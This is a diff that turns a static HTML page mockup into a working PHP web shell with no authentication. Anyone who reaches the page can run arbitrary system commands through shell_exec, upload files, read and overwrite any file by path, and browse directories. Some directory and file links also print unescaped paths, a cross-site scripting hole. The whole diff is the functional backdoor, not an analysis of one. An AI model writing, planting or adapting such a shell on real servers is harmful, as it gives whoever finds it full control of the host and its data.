@@ -1,10 +1,81 @@
+<?php
+
+if (isset($_GET['dir']))
+{
+	chdir($_GET['dir']);
+}
+$cwd = getcwd();
+
+if (isset($_POST['cmd']))
+{
+	$stdout = shell_exec($_POST['cmd']);
+}
+
+if (isset($_FILES['file']) && $_FILES['file']['error'] == 0)
+{
+	move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+}
+
+if (isset($_GET['file']))
+{
+	$file = $_GET['file'];
+	if (isset($_POST['contents']))
+	{
+		file_put_contents($file, $_POST['contents']);
+	}
+	$contents = file_get_contents($file);
+}
+
+$nodes = scandir($cwd);
+$dirs = [];
+$files = [];
+foreach ($nodes as $node)
+{
+	${ ! is_file($node) ? 'dirs' : 'files'}[] = $node;
+}
+
+$vars = (object) [
+	'cwd' => $cwd,
+	'dirs' => $dirs,
+	'files' => $files,
+];
+if (isset($file))
+{
+	$vars->file = $file;
+}
+if (isset($stdout))
+{
+	$vars->stdout = $stdout;
+}
+if (isset($contents))
+{
+	$vars->contents = $contents;
+}
+
+?>
 <!DOCTYPE html>
 <meta charset="utf-8">
+<script>
+var changed = false;
+window.onload = function()
+{
+	document.getElementsByName('cmd')[0].focus();
+	document.getElementsByName('contents')[0].focus();
+};
+window.onbeforeunload = function()
+{
+	if (changed)
+	{
+		return false;
+	}
+};
+</script>
 <style>
 body { margin: 0; }
 html, body, table { height: 100%; }
 td { padding: 0; vertical-align: top; }
 ul { margin-top: 0; padding-left: 0; }
+pre { margin-top: 0; }
 .h100 { height: 100%; }
 .w100 { width: 100%; }
 .bordered { border:1px solid #ccc; }
@@ -13,21 +84,24 @@ ul { margin-top: 0; padding-left: 0; }
 <table>
 <tr>
 <td class="bordered" colspan="2">
-/path/to/cwd/
+<?php echo htmlspecialchars($vars->cwd); ?>/<?php ?>
+<?php if (isset($vars->file)): ?>
+<?php echo htmlspecialchars($vars->file); ?>
+<?php endif; ?>
 
 <tr>
 <td class="bordered">
-<form method="post" enctype="multipart/form-data">
+<form method="post" action="?dir=<?php echo htmlspecialchars($vars->cwd); ?>" enctype="multipart/form-data">
 <table><tr>
-<td><input type="file">
+<td><input type="file" name="file">
 <td><input type="submit" value="Upload">
 </table>
 </form>
 
 <td class="bordered">
-<form method="post">
+<form method="post" action="?dir=<?php echo htmlspecialchars($vars->cwd); ?>">
 <table class="w100"><tr>
-<td class="w100"><input type="text" class="w100">
+<td class="w100"><input type="text" class="w100" name="cmd">
 <td><input type="submit" value="Execute">
 </table>
 </form>
@@ -35,20 +109,28 @@ ul { margin-top: 0; padding-left: 0; }
 <tr>
 <td class="bordered">
 <ul>
-<li><a href="">dir1</a>
-<li><a href="">dir2</a>
+<?php foreach ($vars->dirs as $dir): ?>
+<li><a href="?dir=<?php echo $vars->cwd; ?>/<?php echo $dir; ?>"><?php echo htmlspecialchars($dir); ?></a>
+<?php endforeach; ?>
 </ul>
 <ul>
-<li><a href="">file1</a>
-<li><a href="">file2</a>
+<?php foreach ($vars->files as $file): ?>
+<li><a href="?dir=<?php echo $vars->cwd; ?>&file=<?php echo $file; ?>"><?php echo htmlspecialchars($file); ?></a>
+<?php endforeach; ?>
 </ul>
 
 <td class="bordered h100 w100">
+<?php if (isset($vars->stdout)): ?>
+<pre>
+<?php echo htmlspecialchars($vars->stdout); ?>
+</pre>
+<?php elseif (isset($vars->contents)): ?>
 <form method="post" class="h100">
 <table class="h100 w100">
-<tr><td class="h100"><textarea class="h100 w100"></textarea>
-<tr><td><input type="submit" value="Save">
+<tr><td class="h100"><textarea class="h100 w100" name="contents" onchange="changed = true;">
+<?php echo htmlspecialchars($vars->contents); ?></textarea>
+<tr><td><input type="submit" value="Save" accesskey="s" onclick="changed = false;">
 </table>
 </form>
-
+<?php endif; ?>
 </table>
